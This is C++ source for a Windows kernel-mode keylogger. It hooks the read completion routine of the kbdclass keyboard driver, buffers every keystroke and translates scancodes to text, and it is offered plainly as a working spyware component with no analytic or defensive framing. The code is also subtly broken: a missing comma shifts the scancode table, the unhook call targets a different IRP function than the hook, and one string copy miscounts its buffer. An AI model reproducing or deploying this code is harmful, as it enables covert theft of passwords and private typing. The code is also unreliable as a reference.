
#include "Keylogging.h"
#include "AutoLock.h"

#define	SZ_KEYTABLE 0x53	// Size of the scancodes table.

#define KEY_MAKE  0			// Key pressed flag

const char* SCANCODE_TO_ASCII[SZ_KEYTABLE] =				// Scancodes table.
{
	"[INVALID]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[BACKSPACE]",
	"[INVALID]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"[ENTER]",
	"[CTRL]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"\'"
	"'",
	"[LSHIFT]",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"[RSHIFT]",
	"[INVALID]",
	"[ALT]",
	"[SPACE]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"7",
	"8",
	"9",
	"[INVALID]",
	"4",
	"5",
	"6",
	"[INVALID]",
	"1",
	"2",
	"3",
	"0"
};


NTSTATUS HookedKbdclassCompletionRoutine(PDEVICE_OBJECT, PIRP Irp, PVOID Context) {
	auto* keylogger = reinterpret_cast<Keylogger*>(Context);
	auto loggedLength = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
	keylogger->AppendDataToBuffer(reinterpret_cast<PKEYBOARD_INPUT_DATA>(Irp->AssociatedIrp.SystemBuffer), static_cast<ULONG>(loggedLength));
	return STATUS_SUCCESS;
}

Keylogger::Keylogger(IrpHookManager* HookManager, ULONG BufferSize) : buffer(), hookManager(HookManager), offsetInBuffer(0), bufferLock(), keyloggingInProgress(false) {
	buffer.Reserve(BufferSize);
	bufferLock.Init();
}

VOID Keylogger::StartLogging() {
	if (keyloggingInProgress) {
		LOG_FAIL("Tried to start second keylogging session");
		return;
	}
	UNICODE_STRING kbdDriverName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
	hookManager->InstallCompletionRoutine(&kbdDriverName, HookedKbdclassCompletionRoutine, this, IRP_MJ_READ);
	keyloggingInProgress = true;
}

VOID Keylogger::GetLoggedChars(char* OutputBuffer, ULONG* BufferLength) {
	ULONG written = 0;
	ULONG entries = 0;
	{
		AutoLock<Mutex> lock(bufferLock);
		for (auto data : buffer) {
			entries++;
			if (data.Flags == KEY_MAKE) { // add only pressed keys
				const auto* ascii = SCANCODE_TO_ASCII[data.MakeCode];
				ULONG len = static_cast<ULONG>(strlen(ascii));
				if (written + len > *BufferLength)
					break;
				strcpy_s(OutputBuffer + written, len, ascii);
				written += len;
			}
		}
	}
	*BufferLength = written;
	buffer.SubVec(0, entries);
}

VOID Keylogger::EndKeylogging() {
	UNICODE_STRING kbdDriverName = RTL_CONSTANT_STRING(L"\\Driver\\kbdclass");
	hookManager->RestoreOriginal(&kbdDriverName, IRP_MJ_DEVICE_CONTROL);
	offsetInBuffer = 0;
	RtlZeroMemory(buffer.GetBuffer(), buffer.Size());
}

VOID Keylogger::AppendDataToBuffer(PKEYBOARD_INPUT_DATA LoggedStrokes, ULONG Length) {
	for (ULONG i = 0; i < Length; ++i) {
		buffer.Insert(LoggedStrokes[i], false);
	}
}